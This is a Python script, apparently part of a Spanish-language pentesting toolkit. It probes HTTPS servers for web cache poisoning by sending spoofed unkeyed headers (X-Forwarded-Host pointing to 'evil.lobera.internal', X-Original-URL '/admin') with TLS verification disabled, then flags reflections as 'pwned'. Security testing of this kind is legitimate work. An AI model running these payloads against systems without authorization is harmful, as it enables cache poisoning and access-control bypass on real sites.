# scripts/https/attack/cache_poisoning.py
import ssl, urllib.request, urllib.error
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

UNKEYED_HEADERS = [
    ("X-Forwarded-Host",   "evil.lobera.internal"),
    ("X-Host",             "evil.lobera.internal"),
    ("X-Forwarded-Server", "evil.lobera.internal"),
    ("X-Original-URL",     "/admin"),
    ("X-Rewrite-URL",      "/admin"),
    ("X-Forwarded-Port",   "1337"),
    ("Forwarded",          "host=evil.lobera.internal"),
    ("X-Original-Host",    "evil.lobera.internal"),
]

class Script(BaseScript):
    name        = "cache-poisoning"
    protocol    = "https"
    category    = "attack"
    description = "Script propio: detecta web cache poisoning via headers no cacheados (X-Forwarded-Host, X-Original-URL...)."

    EXAMPLES = [
        {"flag": "-t / --port", "desc": "IP y puerto HTTPS",
         "good": "https --script=cache-poisoning -t 10.10.10.5 --port 443",
         "bad":  "https --script=cache-poisoning (sin -t)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 443)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        ip      = self.target.ip
        url     = f"https://{ip}:{port}{path}"

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

        try:
            req  = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
            try:
                resp     = opener.open(req, timeout=timeout)
                baseline = resp.read(65536).decode("utf-8", errors="replace")
            except urllib.error.HTTPError as e:
                baseline = e.read(65536).decode("utf-8", errors="replace") if e else ""
        except Exception as e:
            print_result("HTTPS", ip, "fail", f"error: {e}")
            return None

        findings = []

        for header, value in UNKEYED_HEADERS:
            try:
                req = urllib.request.Request(url, headers={
                    "User-Agent": "Mozilla/5.0",
                    header:       value,
                    "Connection": "close",
                })
                try:
                    resp   = opener.open(req, timeout=timeout)
                    body   = resp.read(65536).decode("utf-8", errors="replace")
                    hdrs   = {k.lower(): v for k, v in resp.headers.items()}
                except urllib.error.HTTPError as e:
                    body   = e.read(65536).decode("utf-8", errors="replace") if e else ""
                    hdrs   = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}

                location = hdrs.get("location","")
                if value in location:
                    findings.append((header, value[:30], "Location", "CRÍTICO"))
                    session_db.save_finding(ip, "HTTPS", "cache_poisoning_location", f"header={header}")
                    print_result("HTTPS", ip, "pwned",
                                 f"CACHE POISONING via {header} → Location")
                elif value in body and value not in baseline:
                    findings.append((header, value[:30], "Body", "ALTO"))
                    session_db.save_finding(ip, "HTTPS", "cache_poisoning_body", f"header={header}")
                    print_result("HTTPS", ip, "pwned", f"{header} reflejado en body")
            except Exception:
                pass

        if findings:
            print_table(f"Cache Poisoning — {ip}:{port}",
                        ["Header","Valor","Efecto","Severidad"], findings)
        else:
            print_check("Sin cache poisoning detectado", ok=True)

        return findings
